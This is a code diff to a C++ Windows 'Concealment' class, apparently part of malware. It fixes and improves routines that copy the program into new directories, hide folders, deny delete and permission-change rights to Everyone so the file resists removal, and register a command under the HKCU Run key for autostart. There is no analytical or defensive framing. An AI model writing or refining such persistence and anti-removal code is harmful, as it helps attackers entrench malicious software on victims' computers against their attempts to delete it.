@@ -2,7 +2,7 @@
 
 bool Concealment::Replicate(std::wstring fileName, std::wstring newFileName)
 {
-	std::wstring dir = newFileName.substr(0, newFileName.find_last_of(L"/"));
+	std::wstring dir = newFileName.substr(0, newFileName.find_last_of(L"\\"));
 	SHCreateDirectory(NULL, dir.c_str());
 	return CopyFileW(fileName.c_str(), newFileName.c_str(), FALSE);
 }
@@ -12,7 +12,7 @@ bool Concealment::HideFolder(std::wstring path)
 	return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
 }
 
-bool RemoveDeletePermission(std::wstring path)
+bool Concealment::RemoveDeletePermission(std::wstring path)
 {
 	PSECURITY_DESCRIPTOR pSD = NULL;
 	PACL pDacl = NULL, pNewDacl = NULL;
@@ -20,12 +20,21 @@ bool RemoveDeletePermission(std::wstring path)
 
 	if (!GetNamedSecurityInfoW(path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD))
 	{
-		EXPLICIT_ACCESSW ea;
-		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
-		std::wstring trustee(L"EVERYONE");
-		BuildExplicitAccessWithNameW(&ea, &trustee[0], DELETE | WRITE_DAC | WRITE_OWNER, DENY_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
+		SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
+		PSID everyone_sid = NULL;
+		AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
+			0, 0, 0, 0, 0, 0, 0, &everyone_sid);
 
-		if (!SetEntriesInAclW(1, &ea, pDacl, &pNewDacl))
+		EXPLICIT_ACCESSW ea = { 0 };
+		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
+		ea.grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
+		ea.grfAccessMode = DENY_ACCESS;
+		ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
+		ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+		ea.Trustee.ptstrName = (LPWSTR)everyone_sid;
+		DWORD errNo = SetEntriesInAclW(1, &ea, pDacl, &pNewDacl);
+		if (!errNo)
 		{
 			dwRes = SetNamedSecurityInfoW(&path[0], SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
 			LocalFree(pNewDacl);
@@ -46,7 +55,7 @@ bool Concealment::AddToAutorun(std::wstring path, std::wstring name, std::vector
 	HKEY hKey;
 	if (!RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
 	{
-		return !RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE *)cmd.c_str(), (cmd.size + 1) * sizeof(wchar_t));
+		return !RegSetValueExW(hKey, name.c_str(), (DWORD)0, REG_SZ, (BYTE *)cmd.c_str(), (cmd.size() + 1) * sizeof(wchar_t));
 	}
 	return false;
 }
